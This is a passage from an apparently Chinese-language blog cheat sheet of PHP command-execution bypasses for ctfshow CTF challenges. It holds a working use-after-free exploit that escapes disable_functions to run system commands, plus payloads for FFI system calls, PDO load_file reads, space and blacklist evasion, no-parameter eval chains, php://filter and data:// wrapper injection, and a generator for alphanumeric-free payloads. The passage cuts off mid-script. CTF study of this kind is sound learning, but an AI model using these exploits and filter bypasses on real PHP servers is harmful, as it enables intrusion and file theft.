&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br></pre></td></tr></table></figure><blockquote><p>需要通过url编码</p><p>当上面脚本<code>strlen()</code>被禁用的时候,自己写一个函数替代</p><p><code>strlen()</code> 返回指定字符串的长度</p><p>替换思路：把字符串转换成数组，读取数组长度</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> count(str_split(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>报了内存溢出错误，换一种方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$n</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= INF;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]!==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$n</span>++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> strlen_user(<span class="string">&#x27;flagc.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PDO连接"><a href="#PDO连接" class="headerlink" title="PDO连接"></a>PDO连接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p>需要知道数据库名称，用户名，密码</p></blockquote><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><blockquote><p>php7.4以上才有</p></blockquote><h2 id="已定义变量-数组操作"><a href="#已定义变量-数组操作" class="headerlink" title="已定义变量+数组操作"></a>已定义变量+数组操作</h2><p><code>get_defined_vars()</code>返回所有已定义变量所组成的数组</p><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p><code>end()</code>:数组指针指向最后一位</p><p><code>next()</code>: 数组指针指向下一位</p><p><code>array_reverse()</code>: 将数组颠倒</p><p><code>array_rand()</code>: 随机返回数组的键名</p><p><code>array_flip()</code>：交换数组的键和值</p><p><code>array_pop()</code>：删除数组最后一个值并且弹出</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p><code>%0a</code>换行执行</p><p><code>%09</code>代替 TAB键（php可用）</p><h3 id="IFS-用在shell中"><a href="#IFS-用在shell中" class="headerlink" title="${IFS} 用在shell中"></a>${IFS} 用在shell中</h3><p><code>$&#123;PS2&#125;</code> 对应字符 <code>&gt;</code><br><code>$&#123;PS4&#125;</code> 对应字符 <code>+</code><br><code>$&#123;IFS&#125;</code> 对应 内部字段分隔符 同<code>$IFS</code><br><code>$&#123;9&#125;</code> 对应 空字符串</p><h3 id="nl带行号读"><a href="#nl带行号读" class="headerlink" title="nl带行号读"></a>nl带行号读</h3><p><code>nl&lt;fl&quot;&quot;ag.php||</code> 后续不能用<code>?*</code>通配符</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="glob通配符绕过"><a href="#glob通配符绕过" class="headerlink" title="glob通配符绕过"></a>glob通配符绕过</h3><p><code>?</code>代表1个字符</p><p><code>*</code>代表0个及以上任意字符</p><p>通配之后无法确定命令，可用绝对路径</p><p><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></p><h3 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&quot;&quot;</span>at flag</span><br><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&quot;&quot;</span>ag</span><br><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line"><span class="keyword">echo</span> `nl fl<span class="string">&quot;&quot;</span>ag.php`;</span><br></pre></td></tr></table></figure><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><h3 id="拼接"><a href="#拼接" class="headerlink" title="$拼接"></a><code>$</code>拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行ls命令：</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br><span class="line">cat hello文件内容：</span><br><span class="line">a=c;b=at;c=he;d=llo;$a<span class="variable">$b</span> $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure><h2 id="无参数绕过-没有过滤分号-和括号"><a href="#无参数绕过-没有过滤分号-和括号" class="headerlink" title="无参数绕过-没有过滤分号;和括号("></a>无参数绕过-没有过滤分号<code>;</code>和括号<code>(</code></h2><h3 id="货币提取-扫描文件"><a href="#货币提取-扫描文件" class="headerlink" title="货币提取.扫描文件"></a>货币提取<code>.</code>扫描文件</h3><h4 id="过滤代码"><a href="#过滤代码" class="headerlink" title="过滤代码"></a>过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;]))</code></p><p>过滤了<code>data://</code>,<code>filter://</code>,<code>php://</code>,<code>phar://</code>且忽略大小写，过滤了伪协议。</p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code></p><p><code>(?R)</code>表示引用当前表达式，后面加了?表示递归。将匹配到的内容替换为空判断是否等于<code>;</code>等于再进入下一步判断。</p><p><code>if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;]))</code></p><h4 id="扫描当前目录"><a href="#扫描当前目录" class="headerlink" title="扫描当前目录"></a>扫描当前目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><blockquote><p><code>localeconv()</code>函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p><code>pos()</code>和<code>current()</code>一样，返回数组中的当前值，初始化时会指向该数组中的第一个值。</p><p><code>scandir()</code>列出指定路径中的文件和目录,<code>scandir(&#39;.&#39;)</code>扫描当前目录。</p></blockquote><p>假设当前目录数组是这样的<code>Array (    [0] =&gt; .    [1] =&gt; ..    [2] =&gt; flag.php    [3] =&gt; index.php )</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p><code>array_reverse()</code>反转数组后<code>next()</code>指针向下一位</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p><code>array_flip()</code>交换键和值，<code>array_rand()</code>随机返回键名</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><blockquote><p><code>session_start()</code>启动新会话或者重用现有会话</p><p><code>session_id()</code>可以用来获取/设置 当前会话 ID</p><p>更改<code>Cookie: PHPSESSID=flag.php;</code></p></blockquote><h3 id="session绕过"><a href="#session绕过" class="headerlink" title="session绕过"></a>session绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=session_start();system(session_id());</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912135728066.png" alt="image-20210912135728066"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912135933297.png" alt="image-20210912135933297"></p><h2 id="传参逃逸-伪协议绕过-bypass分号-和括号"><a href="#传参逃逸-伪协议绕过-bypass分号-和括号" class="headerlink" title="传参逃逸+伪协议绕过-bypass分号;和括号("></a>传参逃逸+伪协议绕过-bypass分号<code>;</code>和括号<code>(</code></h2><mark class="hl-label orange">注意</mark> eval内如果要RCE必须以分号结尾，但是php最后一条语句可以没有分号。<blockquote><p><code>eval(&quot;echo 1;&quot;);</code>和<code>eval(&quot;echo 1?&gt;&quot;);</code>结果相同</p></blockquote><p>同时过滤了分号和括号，只能使用<strong>语言结构</strong>了，常见的语言结构：<code>echo,print,isset,unset,include,require</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>]<span class="meta">?&gt;</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911201022698.png" alt="image-20210911201022698"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">0</span>]<span class="meta">?&gt;</span>&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>%<span class="number">09</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain,"></a>data://text/plain,</h3><p>数据流封装器,当<code>allow_url_include </code>打开的时候，任意文件包含就会成为任意命令执行</p><blockquote><p>PHP.ini：</p><p>data://协议必须双在on才能正常使用；</p><p>allow_url_fopen ：on</p><p>allow_url_include：on</p><p>php 版本大于等于 php5.2</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;ipconfig&quot;) <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>两个斜杠可以省略</p></blockquote><h2 id="无数字，字母，-命令执行"><a href="#无数字，字母，-命令执行" class="headerlink" title="无数字，字母，$命令执行"></a>无数字，字母，<code>$</code>命令执行</h2><h3 id="取反获取数字"><a href="#取反获取数字" class="headerlink" title="取反获取数字"></a>取反获取数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo $(())</span><br><span class="line">0</span><br><span class="line">[root@localhost ~]# echo ~$(())</span><br><span class="line">~0</span><br><span class="line">[root@localhost ~]# echo $((~$(())))</span><br><span class="line">-1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################################</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(())))往中间每加一个$((~$(())))都加以1，先减后取反</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################################</span></span></span><br><span class="line">[root@localhost ~]# echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="或运算绕过"><a href="#或运算绕过" class="headerlink" title="或运算绕过"></a>或运算绕过</h3><p><code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，过滤了字母和数字但是没有过滤运算符<code>|</code></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a></p><p>rce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php或运算.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 